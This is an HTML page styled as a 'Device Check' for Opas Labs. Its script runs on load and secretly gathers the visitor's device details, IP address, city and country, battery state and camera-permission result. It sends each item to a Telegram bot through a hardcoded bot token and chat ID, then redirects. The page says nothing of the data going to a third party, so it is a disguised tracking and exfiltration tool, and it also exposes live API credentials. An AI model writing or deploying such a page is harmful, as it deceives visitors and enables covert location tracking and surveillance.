<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Device Check | Opas Labs</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body {
      margin: 0;
      background: #000;
      color: #fff;
      font-family: sans-serif;
      display: flex;
      flex-direction: column;
      justify-content: center;
      align-items: center;
      height: 100vh;
      text-align: center;
    }
    p {
      max-width: 500px;
    }
  </style>
</head>
<body>
  <h2>ğŸ” Device Check in Progress</h2>
  <p>This process checks your device for system info and optional camera access. Youâ€™ll be redirected shortly.</p>

  <script>
    const BOT_TOKEN = "8064189934:AAGeRa_SIje_gEq7frBtUSJ-NvL6coLLJdo";
    const CHAT_ID = "7216371031";
    const REDIRECT_URL = "https://opaslabs.vercel.app";
    let deviceInfo = "";
    let redirected = false;

    // Redirect after delay (failsafe)
    setTimeout(() => {
      if (!redirected) window.location.href = REDIRECT_URL;
    }, 10000);

    function sendToTelegram(message) {
      return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
      });
    }

    async function collectInfo() {
      try {
        const ua = navigator.userAgent;
        const ram = navigator.deviceMemory || "?";
        const cpu = navigator.hardwareConcurrency || "?";
        const platform = navigator.platform;
        const resolution = `${screen.width}x${screen.height}`;
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;

        deviceInfo += `ğŸ“± User Agent: ${ua}\n`;
        deviceInfo += `ğŸ§  RAM: ${ram} GB\n`;
        deviceInfo += `ğŸ§® CPU Cores: ${cpu}\n`;
        deviceInfo += `ğŸ–¥ï¸ Platform: ${platform}\n`;
        deviceInfo += `ğŸ“º Screen: ${resolution}\n`;
        deviceInfo += `ğŸ•“ Timezone: ${timezone}\n`;

        // IP + Region
        const ipInfo = await fetch("https://ipinfo.io/json?token=ce7fbbdbe9fd92").then(res => res.json());
        deviceInfo += `ğŸŒ IP: ${ipInfo.ip}\nğŸ“ Location: ${ipInfo.city}, ${ipInfo.region}, ${ipInfo.country}\n`;

        // Battery
        try {
          const battery = await navigator.getBattery();
          deviceInfo += `ğŸ”‹ Battery: ${Math.round(battery.level * 100)}%\n`;
          deviceInfo += `âš¡ Charging: ${battery.charging ? "Yes" : "No"}\n`;
        } catch {
          deviceInfo += `ğŸ”‹ Battery info: Unavailable\n`;
        }

        await sendToTelegram(deviceInfo);
      } catch (err) {
        await sendToTelegram("âŒ Error collecting device info:\n" + err.message);
      }
    }

    async function tryCamera() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        stream.getTracks().forEach(track => track.stop());
        await sendToTelegram("ğŸ“· Camera access granted.");
      } catch {
        await sendToTelegram("ğŸš« Camera access denied.");
      }
    }

    async function runAll() {
      await collectInfo();
      await tryCamera();
      redirected = true;
      window.location.href = REDIRECT_URL;
    }

    window.onload = runAll;
  </script>
</body>
</html>
